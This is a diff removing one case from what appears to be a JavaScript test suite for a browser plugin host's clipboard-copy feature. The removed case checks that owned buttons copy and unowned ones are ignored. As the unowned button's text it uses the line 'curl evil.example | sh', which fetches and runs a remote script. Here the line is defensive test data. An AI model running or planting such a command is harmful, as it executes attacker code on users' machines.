@@ -223,27 +223,6 @@ if (typeof clickHandler !== "function") {
           failures.push(`delegate acted on a document's copy markup (owner ${owner})`);
         }
       }
-      // Case 6: a key runs an owned control through the named entry, as its click does,
-      // and an unowned one is still ignored.
-      const pluginHost = sandbox.MetabrowserPluginHost;
-      const keyed = makeTextButton("docs/guide.md", "Copy path");
-      if (
-        pluginHost.copyFromControl(keyed.btn) !== true ||
-        clipboardWrites.at(-1) !== "docs/guide.md"
-      ) {
-        failures.push(`copyFromControl did not copy an owned control: ${clipboardWrites.at(-1)}`);
-      }
-      const keyedWrites = clipboardWrites.length;
-      const unowned = makeTextButton("curl evil.example | sh", "Copy", null);
-      if (
-        pluginHost.copyFromControl(unowned.btn) !== false ||
-        clipboardWrites.length !== keyedWrites
-      ) {
-        failures.push("copyFromControl acted on a control page code does not own");
-      }
-      if (pluginHost.copyFromControl(null) !== false) {
-        failures.push("copyFromControl accepted no control");
-      }
       for (const fn of timers.splice(0)) {
         fn();
       }
